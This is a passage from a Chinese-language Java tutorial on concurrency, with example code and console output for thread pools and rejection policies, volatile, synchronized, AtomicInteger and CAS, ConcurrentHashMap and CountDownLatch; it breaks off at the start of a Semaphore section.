}\n\n}\n```\n\n**控制台输出结果**\n\n```java\n1.通过new初始化一个线程，但是还没有thread.start()之前，线程的状态：NEW\n2.执行thread.start()之后，线程的状态：RUNNABLE\n3.因为等待锁而阻塞时，线程的状态：BLOCKED\n4.阻塞结束后，线程的状态：RUNNABLE\n5.线程执行完毕之后，线程的状态：TERMINATED\n```\n\n\n\n### 1.5 线程池-基本原理\n\n**概述 :** \n\n​\t提到池，大家应该能想到的就是水池。水池就是一个容器，在该容器中存储了很多的水。那么什么是线程池呢？线程池也是可以看做成一个池子，在该池子中存储很多个线程。\n\n线程池存在的意义：\n\n​\t系统创建一个线程的成本是比较高的，因为它涉及到与操作系统交互，当程序中需要创建大量生存期很短暂的线程时，频繁的创建和销毁线程对系统的资源消耗有可能大于业务处理是对系\n\n​\t统资源的消耗，这样就有点"舍本逐末"了。针对这一种情况，为了提高性能，我们就可以采用线程池。线程池在启动的时，会创建大量空闲线程，当我们向线程池提交任务的时，线程池就\n\n​\t会启动一个线程来执行该任务。等待任务执行完毕以后，线程并不会死亡，而是再次返回到线程池中称为空闲状态。等待下一次任务的执行。\n\n**线程池的设计思路 :**\n\n1. 准备一个任务容器\n2. 一次性启动多个(2个)消费者线程\n3. 刚开始任务容器是空的，所以线程都在wait\n4. 直到一个外部线程向这个任务容器中扔了一个"任务"，就会有一个消费者线程被唤醒\n5. 这个消费者线程取出"任务"，并且执行这个任务，执行完毕后，继续等待下一次任务的到来\n\n### 1.6 线程池-Executors默认线程池\n\n概述 : JDK对线程池也进行了相关的实现，在真实企业开发中我们也很少去自定义线程池，而是使用JDK中自带的线程池。\n\n我们可以使用Executors中所提供的**静态**方法来创建线程池\n\n​\tstatic ExecutorService newCachedThreadPool()   创建一个默认的线程池\n\tstatic newFixedThreadPool(int nThreads)\t    创建一个指定最多线程数量的线程池\n\n**代码实现 :** \n\n```java\npackage com.itheima.mythreadpool;\n\n\n//static ExecutorService newCachedThreadPool()   创建一个默认的线程池\n//static newFixedThreadPool(int nThreads)\t    创建一个指定最多线程数量的线程池\n\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class MyThreadPoolDemo {\n    public static void main(String[] args) throws InterruptedException {\n\n        //1,创建一个默认的线程池对象.池子中默认是空的.默认最多可以容纳int类型的最大值.\n        ExecutorService executorService = Executors.newCachedThreadPool();\n        //Executors --- 可以帮助我们创建线程池对象\n        //ExecutorService --- 可以帮助我们控制线程池\n\n        executorService.submit(()->{\n            System.out.println(Thread.currentThread().getName() + "在执行了");\n        });\n\n        //Thread.sleep(2000);\n\n        executorService.submit(()->{\n            System.out.println(Thread.currentThread().getName() + "在执行了");\n        });\n\n        executorService.shutdown();\n    }\n}\n\n```\n\n\n\n### 1.7 线程池-Executors创建指定上限的线程池\n\n**使用Executors中所提供的静态方法来创建线程池**\n\n​\tstatic ExecutorService newFixedThreadPool(int nThreads) : 创建一个指定最多线程数量的线程池\n\n**代码实现 :** \n\n```java\npackage com.itheima.mythreadpool;\n\n//static ExecutorService newFixedThreadPool(int nThreads)\n//创建一个指定最多线程数量的线程池\n\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.ThreadPoolExecutor;\n\npublic class MyThreadPoolDemo2 {\n    public static void main(String[] args) {\n        //参数不是初始值而是最大值\n        ExecutorService executorService = Executors.newFixedThreadPool(10);\n\n        ThreadPoolExecutor pool = (ThreadPoolExecutor) executorService;\n        System.out.println(pool.getPoolSize());//0\n\n        executorService.submit(()->{\n            System.out.println(Thread.currentThread().getName() + "在执行了");\n        });\n\n        executorService.submit(()->{\n            System.out.println(Thread.currentThread().getName() + "在执行了");\n        });\n\n        System.out.println(pool.getPoolSize());//2\n//        executorService.shutdown();\n    }\n}\n\n```\n\n\n\n### 1.8 线程池-ThreadPoolExecutor\n\n**创建线程池对象 :** \n\nThreadPoolExecutor threadPoolExecutor = new ThreadPoolExecutor(核心线程数量,最大线程数量,空闲线程最大存活时间,任务队列,创建线程工厂,任务的拒绝策略);\n\n**代码实现 :** \n\n```java\npackage com.itheima.mythreadpool;\n\nimport java.util.concurrent.ArrayBlockingQueue;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\npublic class MyThreadPoolDemo3 {\n//    参数一：核心线程数量\n//    参数二：最大线程数\n//    参数三：空闲线程最大存活时间\n//    参数四：时间单位\n//    参数五：任务队列\n//    参数六：创建线程工厂\n//    参数七：任务的拒绝策略\n    public static void main(String[] args) {\n        ThreadPoolExecutor pool = new ThreadPoolExecutor(2,5,2,TimeUnit.SECONDS,new ArrayBlockingQueue<>(10), Executors.defaultThreadFactory(),new ThreadPoolExecutor.AbortPolicy());\n        pool.submit(new MyRunnable());\n        pool.submit(new MyRunnable());\n\n        pool.shutdown();\n    }\n}\n```\n\n### 1.9 线程池-参数详解\n\n![1591165506516](./img/java/basics/day22-多线程02.img/1591165506516.png)\n\n```java\npublic ThreadPoolExecutor(int corePoolSize,\n                              int maximumPoolSize,\n                              long keepAliveTime,\n                              TimeUnit unit,\n                              BlockingQueue<Runnable> workQueue,\n                              ThreadFactory threadFactory,\n                              RejectedExecutionHandler handler)\n    \ncorePoolSize：   核心线程的最大值，不能小于0\nmaximumPoolSize：最大线程数，不能小于等于0，maximumPoolSize >= corePoolSize\nkeepAliveTime：  空闲线程最大存活时间,不能小于0\nunit：           时间单位\nworkQueue：      任务队列，不能为null\nthreadFactory：  创建线程工厂,不能为null      \nhandler：        任务的拒绝策略,不能为null  \n```\n\n\n\n### 1.10 线程池-非默认任务拒绝策略\n\nRejectedExecutionHandler是jdk提供的一个任务拒绝策略接口，它下面存在4个子类。\n\n```java\nThreadPoolExecutor.AbortPolicy: \t\t    丢弃任务并抛出RejectedExecutionException异常。是默认的策略。\nThreadPoolExecutor.DiscardPolicy： \t\t   丢弃任务，但是不抛出异常 这是不推荐的做法。\nThreadPoolExecutor.DiscardOldestPolicy：    抛弃队列中等待最久的任务 然后把当前任务加入队列中。\nThreadPoolExecutor.CallerRunsPolicy:        调用任务的run()方法绕过线程池直接执行。\n```\n\n注：明确线程池对多可执行的任务数 = 队列容量 + 最大线程数\n\n**案例演示1**：演示ThreadPoolExecutor.AbortPolicy任务处理策略\n\n```java\npublic class ThreadPoolExecutorDemo01 {\n\n    public static void main(String[] args) {\n\n        /**\n         * 核心线程数量为1 ， 最大线程池数量为3, 任务容器的容量为1 ,空闲线程的最大存在时间为20s\n         */\n        ThreadPoolExecutor threadPoolExecutor = new ThreadPoolExecutor(1 , 3 , 20 , TimeUnit.SECONDS ,\n                new ArrayBlockingQueue<>(1) , Executors.defaultThreadFactory() , new ThreadPoolExecutor.AbortPolicy()) ;\n\n        // 提交5个任务，而该线程池最多可以处理4个任务，当我们使用AbortPolicy这个任务处理策略的时候，就会抛出异常\n        for(int x = 0 ; x < 5 ; x++) {\n            threadPoolExecutor.submit(() -> {\n                System.out.println(Thread.currentThread().getName() + "----\x3e> 执行了任务");\n            });\n        }\n    }\n}\n```\n\n**控制台输出结果**\n\n```java\npool-1-thread-1----\x3e> 执行了任务\npool-1-thread-3----\x3e> 执行了任务\npool-1-thread-2----\x3e> 执行了任务\npool-1-thread-3----\x3e> 执行了任务\n```\n\n控制台报错，仅仅执行了4个任务，有一个任务被丢弃了\n\n\n\n**案例演示2**：演示ThreadPoolExecutor.DiscardPolicy任务处理策略\n\n```java\npublic class ThreadPoolExecutorDemo02 {\n    public static void main(String[] args) {\n        /**\n         * 核心线程数量为1 ， 最大线程池数量为3, 任务容器的容量为1 ,空闲线程的最大存在时间为20s\n         */\n        ThreadPoolExecutor threadPoolExecutor = new ThreadPoolExecutor(1 , 3 , 20 , TimeUnit.SECONDS ,\n                new ArrayBlockingQueue<>(1) , Executors.defaultThreadFactory() , new ThreadPoolExecutor.DiscardPolicy()) ;\n\n        // 提交5个任务，而该线程池最多可以处理4个任务，当我们使用DiscardPolicy这个任务处理策略的时候，控制台不会报错\n        for(int x = 0 ; x < 5 ; x++) {\n            threadPoolExecutor.submit(() -> {\n                System.out.println(Thread.currentThread().getName() + "----\x3e> 执行了任务");\n            });\n        }\n    }\n}\n```\n\n**控制台输出结果**\n\n```java\npool-1-thread-1----\x3e> 执行了任务\npool-1-thread-1----\x3e> 执行了任务\npool-1-thread-3----\x3e> 执行了任务\npool-1-thread-2----\x3e> 执行了任务\n```\n\n控制台没有报错，仅仅执行了4个任务，有一个任务被丢弃了\n\n\n\n**案例演示3**：演示ThreadPoolExecutor.DiscardOldestPolicy任务处理策略\n\n```java\npublic class ThreadPoolExecutorDemo02 {\n    public static void main(String[] args) {\n        /**\n         * 核心线程数量为1 ， 最大线程池数量为3, 任务容器的容量为1 ,空闲线程的最大存在时间为20s\n         */\n        ThreadPoolExecutor threadPoolExecutor;\n        threadPoolExecutor = new ThreadPoolExecutor(1 , 3 , 20 , TimeUnit.SECONDS ,\n                new ArrayBlockingQueue<>(1) , Executors.defaultThreadFactory() , new ThreadPoolExecutor.DiscardOldestPolicy());\n        // 提交5个任务\n        for(int x = 0 ; x < 5 ; x++) {\n            // 定义一个变量，来指定指定当前执行的任务;这个变量需要被final修饰\n            final int y = x ;\n            threadPoolExecutor.submit(() -> {\n                System.out.println(Thread.currentThread().getName() + "----\x3e> 执行了任务" + y);\n            });     \n        }\n    }\n}\n```\n\n**控制台输出结果**\n\n```java\npool-1-thread-2----\x3e> 执行了任务2\npool-1-thread-1----\x3e> 执行了任务0\npool-1-thread-3----\x3e> 执行了任务3\npool-1-thread-1----\x3e> 执行了任务4\n```\n\n由于任务1在线程池中等待时间最长，因此任务1被丢弃。\n\n\n\n**案例演示4**：演示ThreadPoolExecutor.CallerRunsPolicy任务处理策略\n\n```java\npublic class ThreadPoolExecutorDemo04 {\n    public static void main(String[] args) {\n\n        /**\n         * 核心线程数量为1 ， 最大线程池数量为3, 任务容器的容量为1 ,空闲线程的最大存在时间为20s\n         */\n        ThreadPoolExecutor threadPoolExecutor;\n        threadPoolExecutor = new ThreadPoolExecutor(1 , 3 , 20 , TimeUnit.SECONDS ,\n                new ArrayBlockingQueue<>(1) , Executors.defaultThreadFactory() , new ThreadPoolExecutor.CallerRunsPolicy());\n\n        // 提交5个任务\n        for(int x = 0 ; x < 5 ; x++) {\n            threadPoolExecutor.submit(() -> {\n                System.out.println(Thread.currentThread().getName() + "----\x3e> 执行了任务");\n            });\n        }\n    }\n}\n```\n\n**控制台输出结果**\n\n```java\npool-1-thread-1----\x3e> 执行了任务\npool-1-thread-3----\x3e> 执行了任务\npool-1-thread-2----\x3e> 执行了任务\npool-1-thread-1----\x3e> 执行了任务\nmain----\x3e> 执行了任务\n```\n\n通过控制台的输出，我们可以看到次策略没有通过线程池中的线程执行任务，而是直接调用任务的run()方法绕过线程池直接执行。\n\n## 2. 原子性\n\n### 2.1 volatile-问题\n\n**代码分析 :** \n\n```java\npackage com.itheima.myvolatile;\n\npublic class Demo {\n    public static void main(String[] args) {\n        MyThread1 t1 = new MyThread1();\n        t1.setName("小路同学");\n        t1.start();\n\n        MyThread2 t2 = new MyThread2();\n        t2.setName("小皮同学");\n        t2.start();\n    }\n}\n```\n\n```java\npackage com.itheima.myvolatile;\n\npublic class Money {\n    public static int money = 100000;\n}\n```\n\n```java\npackage com.itheima.myvolatile;\n\npublic class MyThread1 extends  Thread {\n    @Override\n    public void run() {\n        while(Money.money == 100000){\n\n        }\n\n        System.out.println("结婚基金已经不是十万了");\n    }\n}\n\n```\n\n```java\npackage com.itheima.myvolatile;\n\npublic class MyThread2 extends Thread {\n    @Override\n    public void run() {\n        try {\n            Thread.sleep(10);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n\n        Money.money = 90000;\n    }\n}\n\n```\n\n**程序问题 :**  女孩虽然知道结婚基金是十万，但是当基金的余额发生变化的时候，女孩无法知道最新的余额。\n\n\n\n### 2.2 volatile解决\n\n**以上案例出现的问题 :**\n\n​\t当A线程修改了共享数据时，B线程没有及时获取到最新的值，如果还在使用原先的值，就会出现问题 \n\n​\t1，堆内存是唯一的，每一个线程都有自己的线程栈。\n\n​\t2 ，每一个线程在使用堆里面变量的时候，都会先拷贝一份到变量的副本中。\n\n​\t3 ，在线程中，每一次使用是从变量的副本中获取的。\n\n**Volatile关键字 :** 强制线程每次在使用的时候，都会看一下共享区域最新的值\n\n**代码实现 :** **使用volatile关键字解决**\n\n```java\npackage com.itheima.myvolatile;\n\npublic class Demo {\n    public static void main(String[] args) {\n        MyThread1 t1 = new MyThread1();\n        t1.setName("小路同学");\n        t1.start();\n\n        MyThread2 t2 = new MyThread2();\n        t2.setName("小皮同学");\n        t2.start();\n    }\n}\n```\n\n```java\npackage com.itheima.myvolatile;\n\npublic class Money {\n    public static volatile int money = 100000;\n}\n```\n\n```java\npackage com.itheima.myvolatile;\n\npublic class MyThread1 extends  Thread {\n    @Override\n    public void run() {\n        while(Money.money == 100000){\n\n        }\n\n        System.out.println("结婚基金已经不是十万了");\n    }\n}\n\n```\n\n```java\npackage com.itheima.myvolatile;\n\npublic class MyThread2 extends Thread {\n    @Override\n    public void run() {\n        try {\n            Thread.sleep(10);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n\n        Money.money = 90000;\n    }\n}\n\n```\n\n\n\n### 2.3 synchronized解决\n\n**synchronized解决 :** \n\n​\t1 ，线程获得锁\n\n​\t2 ，清空变量副本\n\n​\t3 ，拷贝共享变量最新的值到变量副本中\n\n​\t4 ，执行代码\n\n​\t5 ，将修改后变量副本中的值赋值给共享数据\n\n​\t6 ，释放锁\n\n**代码实现 :** \n\n```java\npackage com.itheima.myvolatile2;\n\npublic class Demo {\n    public static void main(String[] args) {\n        MyThread1 t1 = new MyThread1();\n        t1.setName("小路同学");\n        t1.start();\n\n        MyThread2 t2 = new MyThread2();\n        t2.setName("小皮同学");\n        t2.start();\n    }\n}\n```\n\n```java\npackage com.itheima.myvolatile2;\n\npublic class Money {\n    public static Object lock = new Object();\n    public static volatile int money = 100000;\n}\n```\n\n```java\npackage com.itheima.myvolatile2;\n\npublic class MyThread1 extends  Thread {\n    @Override\n    public void run() {\n        while(true){\n            synchronized (Money.lock){\n                if(Money.money != 100000){\n                    System.out.println("结婚基金已经不是十万了");\n                    break;\n                }\n            }\n        }\n    }\n}\n```\n\n```java\npackage com.itheima.myvolatile2;\n\npublic class MyThread2 extends Thread {\n    @Override\n    public void run() {\n        synchronized (Money.lock) {\n            try {\n                Thread.sleep(10);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n\n            Money.money = 90000;\n        }\n    }\n}\n```\n\n\n\n### 2.4 原子性\n\n**概述 :** 所谓的原子性是指在一次操作或者多次操作中，要么所有的操作全部都得到了执行并且不会受到任何因素的干扰而中断，要么所有的操作都不执行，多个操作是一个不可以分割的整体。\n\n**代码实现 :** \n\n```java\npackage com.itheima.threadatom;\n\npublic class AtomDemo {\n    public static void main(String[] args) {\n        MyAtomThread atom = new MyAtomThread();\n\n        for (int i = 0; i < 100; i++) {\n            new Thread(atom).start();\n        }\n    }\n}\nclass MyAtomThread implements Runnable {\n    private volatile int count = 0; //送冰淇淋的数量\n\n    @Override\n    public void run() {\n        for (int i = 0; i < 100; i++) {\n            //1,从共享数据中读取数据到本线程栈中.\n            //2,修改本线程栈中变量副本的值\n            //3,会把本线程栈中变量副本的值赋值给共享数据.\n            count++;\n            System.out.println("已经送了" + count + "个冰淇淋");\n        }\n    }\n}\n```\n\n**代码总结 :** count++ 不是一个原子性操作, 他在执行的过程中,有可能被其他线程打断\n\n\n\n### 2.5 volatile关键字不能保证原子性\n\n解决方案 : 我们可以给count++操作添加锁，那么count++操作就是临界区中的代码，临界区中的代码一次只能被一个线程去执行，所以count++就变成了原子操作。\n\n```java\npackage com.itheima.threadatom2;\n\npublic class AtomDemo {\n    public static void main(String[] args) {\n        MyAtomThread atom = new MyAtomThread();\n\n        for (int i = 0; i < 100; i++) {\n            new Thread(atom).start();\n        }\n    }\n}\nclass MyAtomThread implements Runnable {\n    private volatile int count = 0; //送冰淇淋的数量\n    private Object lock = new Object();\n\n    @Override\n    public void run() {\n        for (int i = 0; i < 100; i++) {\n            //1,从共享数据中读取数据到本线程栈中.\n            //2,修改本线程栈中变量副本的值\n            //3,会把本线程栈中变量副本的值赋值给共享数据.\n            synchronized (lock) {\n                count++;\n                System.out.println("已经送了" + count + "个冰淇淋");\n            }\n        }\n    }\n}\n```\n\n\n\n### 2.6 原子性_AtomicInteger\n\n概述：java从JDK1.5开始提供了java.util.concurrent.atomic包(简称Atomic包)，这个包中的原子操作类提供了一种用法简单，性能高效，线程安全地更新一个变量的方式。因为变\n\n量的类型有很多种，所以在Atomic包里一共提供了13个类，属于4种类型的原子更新方式，分别是原子更新基本类型、原子更新数组、原子更新引用和原子更新属性(字段)。本次我们只讲解\n\n使用原子的方式更新基本类型，使用原子的方式更新基本类型Atomic包提供了以下3个类：\n\nAtomicBoolean： 原子更新布尔类型\n\nAtomicInteger：   原子更新整型\n\nAtomicLong：\t原子更新长整型\n\n以上3个类提供的方法几乎一模一样，所以本节仅以AtomicInteger为例进行讲解，AtomicInteger的常用方法如下：\n\n```java\npublic AtomicInteger()：\t   \t\t\t    初始化一个默认值为0的原子型Integer\npublic AtomicInteger(int initialValue)：  初始化一个指定值的原子型Integer\n\nint get():   \t\t\t \t\t\t\t获取值\nint getAndIncrement():      \t\t\t 以原子方式将当前值加1，注意，这里返回的是自增前的值。\nint incrementAndGet():     \t\t\t\t 以原子方式将当前值加1，注意，这里返回的是自增后的值。\nint addAndGet(int data):\t\t\t\t 以原子方式将输入的数值与实例中的值（AtomicInteger里的value）相加，并返回结果。\nint getAndSet(int value):   \t\t\t 以原子方式设置为newValue的值，并返回旧值。\n```\n\n**代码实现 :**\n\n```java\npackage com.itheima.threadatom3;\n\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class MyAtomIntergerDemo1 {\n//    public AtomicInteger()：\t               初始化一个默认值为0的原子型Integer\n//    public AtomicInteger(int initialValue)： 初始化一个指定值的原子型Integer\n    public static void main(String[] args) {\n        AtomicInteger ac = new AtomicInteger();\n        System.out.println(ac);\n\n        AtomicInteger ac2 = new AtomicInteger(10);\n        System.out.println(ac2);\n    }\n\n}\n```\n\n```java\npackage com.itheima.threadatom3;\n\nimport java.lang.reflect.Field;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class MyAtomIntergerDemo2 {\n//    int get():   \t\t \t\t获取值\n//    int getAndIncrement():     以原子方式将当前值加1，注意，这里返回的是自增前的值。\n//    int incrementAndGet():     以原子方式将当前值加1，注意，这里返回的是自增后的值。\n//    int addAndGet(int data):\t 以原子方式将参数与对象中的值相加，并返回结果。\n//    int getAndSet(int value):  以原子方式设置为newValue的值，并返回旧值。\n    public static void main(String[] args) {\n//        AtomicInteger ac1 = new AtomicInteger(10);\n//        System.out.println(ac1.get());\n\n//        AtomicInteger ac2 = new AtomicInteger(10);\n//        int andIncrement = ac2.getAndIncrement();\n//        System.out.println(andIncrement);\n//        System.out.println(ac2.get());\n\n//        AtomicInteger ac3 = new AtomicInteger(10);\n//        int i = ac3.incrementAndGet();\n//        System.out.println(i);//自增后的值\n//        System.out.println(ac3.get());\n\n//        AtomicInteger ac4 = new AtomicInteger(10);\n//        int i = ac4.addAndGet(20);\n//        System.out.println(i);\n//        System.out.println(ac4.get());\n\n        AtomicInteger ac5 = new AtomicInteger(100);\n        int andSet = ac5.getAndSet(20);\n        System.out.println(andSet);\n        System.out.println(ac5.get());\n    }\n}\n```\n\n\n\n### 2.7 AtomicInteger-内存解析\n\n**AtomicInteger原理 :** 自旋锁  + CAS 算法\n\n**CAS算法：**\n\n​\t有3个操作数（内存值V， 旧的预期值A，要修改的值B）\n\n​\t当旧的预期值A == 内存值   此时修改成功，将V改为B                 \n\n​\t当旧的预期值A！=内存值   此时修改失败，不做任何操作                 \n\n​\t并重新获取现在的最新值（这个重新获取的动作就是自旋）\n\n### 2.8 AtomicInteger-源码解析\n\n**代码实现 :**\n\n```java\npackage com.itheima.threadatom4;\n\npublic class AtomDemo {\n    public static void main(String[] args) {\n        MyAtomThread atom = new MyAtomThread();\n\n        for (int i = 0; i < 100; i++) {\n            new Thread(atom).start();\n        }\n    }\n}\n```\n\n```java\npackage com.itheima.threadatom4;\n\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class MyAtomThread implements Runnable {\n    //private volatile int count = 0; //送冰淇淋的数量\n    //private Object lock = new Object();\n    AtomicInteger ac = new AtomicInteger(0);\n\n    @Override\n    public void run() {\n        for (int i = 0; i < 100; i++) {\n            //1,从共享数据中读取数据到本线程栈中.\n            //2,修改本线程栈中变量副本的值\n            //3,会把本线程栈中变量副本的值赋值给共享数据.\n            //synchronized (lock) {\n//                count++;\n//                ac++;\n            int count = ac.incrementAndGet();\n            System.out.println("已经送了" + count + "个冰淇淋");\n           // }\n        }\n    }\n}\n\n```\n\n**源码解析 :** \n\n```java\n\n//先自增，然后获取自增后的结果\npublic final int incrementAndGet() {\n        //+ 1 自增后的结果\n        //this 就表示当前的atomicInteger（值）\n        //1    自增一次\n        return U.getAndAddInt(this, VALUE, 1) + 1;\n}\n\npublic final int getAndAddInt(Object o, long offset, int delta) {\n        //v 旧值\n        int v;\n        //自旋的过程\n        do {\n            //不断的获取旧值\n            v = getIntVolatile(o, offset);\n            //如果这个方法的返回值为false，那么继续自旋\n            //如果这个方法的返回值为true，那么自旋结束\n            //o 表示的就是内存值\n            //v 旧值\n            //v + delta 修改后的值\n        } while (!weakCompareAndSetInt(o, offset, v, v + delta));\n            //作用：比较内存中的值，旧值是否相等，如果相等就把修改后的值写到内存中，返回true。表示修改成功。\n            //                                 如果不相等，无法把修改后的值写到内存中，返回false。表示修改失败。\n            //如果修改失败，那么继续自旋。\n        return v;\n}\n```\n\n\n\n### 2.9 悲观锁和乐观锁\n\n**synchronized和CAS的区别 :** \n\n**相同点：**在多线程情况下，都可以保证共享数据的安全性。\n\n**不同点：**synchronized总是从最坏的角度出发，认为每次获取数据的时候，别人都有可能修改。所以在每                       次操作共享数据之前，都会上锁。（悲观锁）\n\n​\tcas是从乐观的角度出发，假设每次获取数据别人都不会修改，所以不会上锁。只不过在修改共享数据的时候，会检查一下，别人有没有修改过这个数据。\n\n​\t如果别人修改过，那么我再次获取现在最新的值。            \n\n​\t 如果别人没有修改过，那么我现在直接修改共享数据的值.(乐观锁）\n\n\n\n## 3. 并发工具类\n\n### 3.1 并发工具类-Hashtable\n\n​\t**Hashtable出现的原因 :** 在集合类中HashMap是比较常用的集合对象，但是HashMap是线程不安全的(多线程环境下可能会存在问题)。为了保证数据的安全性我们可以使用Hashtable，但是Hashtable的效率低下。\n\n**代码实现 :** \n\n```java\npackage com.itheima.mymap;\n\nimport java.util.HashMap;\nimport java.util.Hashtable;\n\npublic class MyHashtableDemo {\n    public static void main(String[] args) throws InterruptedException {\n        Hashtable<String, String> hm = new Hashtable<>();\n\n        Thread t1 = new Thread(() -> {\n            for (int i = 0; i < 25; i++) {\n                hm.put(i + "", i + "");\n            }\n        });\n\n\n        Thread t2 = new Thread(() -> {\n            for (int i = 25; i < 51; i++) {\n                hm.put(i + "", i + "");\n            }\n        });\n\n        t1.start();\n        t2.start();\n\n        System.out.println("----------------------------");\n        //为了t1和t2能把数据全部添加完毕\n        Thread.sleep(1000);\n\n        //0-0 1-1 ..... 50- 50\n\n        for (int i = 0; i < 51; i++) {\n            System.out.println(hm.get(i + ""));\n        }//0 1 2 3 .... 50\n\n\n    }\n}\n```\n\n\n\n### 3.2 并发工具类-ConcurrentHashMap基本使用\n\n​\t**ConcurrentHashMap出现的原因 :** 在集合类中HashMap是比较常用的集合对象，但是HashMap是线程不安全的(多线程环境下可能会存在问题)。为了保证数据的安全性我们可以使用Hashtable，但是Hashtable的效率低下。\n\n基于以上两个原因我们可以使用JDK1.5以后所提供的ConcurrentHashMap。\n\n**体系结构 :** \n\n![1591168965857](./img/java/basics/day22-多线程02.img/1591168965857.png)\n\n**总结 :** \n\n​\t1 ，HashMap是线程不安全的。多线程环境下会有数据安全问题\n\n​\t2 ，Hashtable是线程安全的，但是会将整张表锁起来，效率低下\n\n​\t3，ConcurrentHashMap也是线程安全的，效率较高。     在JDK7和JDK8中，底层原理不一样。\n\n**代码实现 :** \n\n```java\npackage com.itheima.mymap;\n\nimport java.util.Hashtable;\nimport java.util.concurrent.ConcurrentHashMap;\n\npublic class MyConcurrentHashMapDemo {\n    public static void main(String[] args) throws InterruptedException {\n        ConcurrentHashMap<String, String> hm = new ConcurrentHashMap<>(100);\n\n        Thread t1 = new Thread(() -> {\n            for (int i = 0; i < 25; i++) {\n                hm.put(i + "", i + "");\n            }\n        });\n\n\n        Thread t2 = new Thread(() -> {\n            for (int i = 25; i < 51; i++) {\n                hm.put(i + "", i + "");\n            }\n        });\n\n        t1.start();\n        t2.start();\n\n        System.out.println("----------------------------");\n        //为了t1和t2能把数据全部添加完毕\n        Thread.sleep(1000);\n\n        //0-0 1-1 ..... 50- 50\n\n        for (int i = 0; i < 51; i++) {\n            System.out.println(hm.get(i + ""));\n        }//0 1 2 3 .... 50\n    }\n}\n```\n\n\n\n### 3.3 并发工具类-ConcurrentHashMap1.7原理\n\n![1591169254280](./img/java/basics/day22-多线程02.img/1591169254280.png)\n\n### 3.4 并发工具类-ConcurrentHashMap1.8原理\n\n![1591169338256](./img/java/basics/day22-多线程02.img/1591169338256.png)\n\n**总结 :** \n\n​\t1，如果使用空参构造创建ConcurrentHashMap对象，则什么事情都不做。     在第一次添加元素的时候创建哈希表\n\n​\t2，计算当前元素应存入的索引。\n\n​\t3，如果该索引位置为null，则利用cas算法，将本结点添加到数组中。\n\n​\t4，如果该索引位置不为null，则利用volatile关键字获得当前位置最新的结点地址，挂在他下面，变成链表。\t\t\n\n​\t5，当链表的长度大于等于8时，自动转换成红黑树6，以链表或者红黑树头结点为锁对象，配合悲观锁保证多线程操作集合时数据的安全性\n\n### 3.5 并发工具类-CountDownLatch\n\n**CountDownLatch类 :** \t\t\n\n| 方法                               | 解释               |\n| -------------------------------- | ---------------- |\n| public CountDownLatch(int count) | 参数传递线程数，表示等待线程数量 |\n| public void await()              | 让线程等待            |\n| public void countDown()          | 当前线程执行完毕         |\n\n**使用场景：** 让某一条线程等待其他线程执行完毕之后再执行\n\n**代码实现 :** \n\n```java\npackage com.itheima.mycountdownlatch;\n\nimport java.util.concurrent.CountDownLatch;\n\npublic class ChileThread1 extends Thread {\n\n    private CountDownLatch countDownLatch;\n    public ChileThread1(CountDownLatch countDownLatch) {\n        this.countDownLatch = countDownLatch;\n    }\n\n    @Override\n    public void run() {\n        //1.吃饺子\n        for (int i = 1; i <= 10; i++) {\n            System.out.println(getName() + "在吃第" + i + "个饺子");\n        }\n        //2.吃完说一声\n        //每一次countDown方法的时候，就让计数器-1\n        countDownLatch.countDown();\n    }\n}\n\n```\n\n```java\npackage com.itheima.mycountdownlatch;\n\nimport java.util.concurrent.CountDownLatch;\n\npublic class ChileThread2 extends Thread {\n\n    private CountDownLatch countDownLatch;\n    public ChileThread2(CountDownLatch countDownLatch) {\n        this.countDownLatch = countDownLatch;\n    }\n    @Override\n    public void run() {\n        //1.吃饺子\n        for (int i = 1; i <= 15; i++) {\n            System.out.println(getName() + "在吃第" + i + "个饺子");\n        }\n        //2.吃完说一声\n        //每一次countDown方法的时候，就让计数器-1\n        countDownLatch.countDown();\n    }\n}\n\n```\n\n```java\npackage com.itheima.mycountdownlatch;\n\nimport java.util.concurrent.CountDownLatch;\n\npublic class ChileThread3 extends Thread {\n\n    private CountDownLatch countDownLatch;\n    public ChileThread3(CountDownLatch countDownLatch) {\n        this.countDownLatch = countDownLatch;\n    }\n    @Override\n    public void run() {\n        //1.吃饺子\n        for (int i = 1; i <= 20; i++) {\n            System.out.println(getName() + "在吃第" + i + "个饺子");\n        }\n        //2.吃完说一声\n        //每一次countDown方法的时候，就让计数器-1\n        countDownLatch.countDown();\n    }\n}\n\n```\n\n```java\npackage com.itheima.mycountdownlatch;\n\nimport java.util.concurrent.CountDownLatch;\n\npublic class MotherThread extends Thread {\n    private CountDownLatch countDownLatch;\n    public MotherThread(CountDownLatch countDownLatch) {\n        this.countDownLatch = countDownLatch;\n    }\n\n    @Override\n    public void run() {\n        //1.等待\n        try {\n            //当计数器变成0的时候，会自动唤醒这里等待的线程。\n            countDownLatch.await();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        //2.收拾碗筷\n        System.out.println("妈妈在收拾碗筷");\n    }\n}\n\n```\n\n```java\npackage com.itheima.mycountdownlatch;\n\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyCountDownLatchDemo {\n    public static void main(String[] args) {\n        //1.创建CountDownLatch的对象，需要传递给四个线程。\n        //在底层就定义了一个计数器，此时计数器的值就是3\n        CountDownLatch countDownLatch = new CountDownLatch(3);\n        //2.创建四个线程对象并开启他们。\n        MotherThread motherThread = new MotherThread(countDownLatch);\n        motherThread.start();\n\n        ChileThread1 t1 = new ChileThread1(countDownLatch);\n        t1.setName("小明");\n\n        ChileThread2 t2 = new ChileThread2(countDownLatch);\n        t2.setName("小红");\n\n        ChileThread3 t3 = new ChileThread3(countDownLatch);\n        t3.setName("小刚");\n\n        t1.start();\n        t2.start();\n        t3.start();\n    }\n}\n```\n\n**总结 :** \n\n​\t1. CountDownLatch(int count)：参数写等待线程的数量。并定义了一个计数器。\n\n​\t2. await()：让线程等待，当计数器为0时，会唤醒等待的线程\n\n​\t3. countDown()： 线程执行完毕时调用，会将计数器-1。\n\n### 3.6 并发工具类-Semaphore\n\n**使用场景 :** 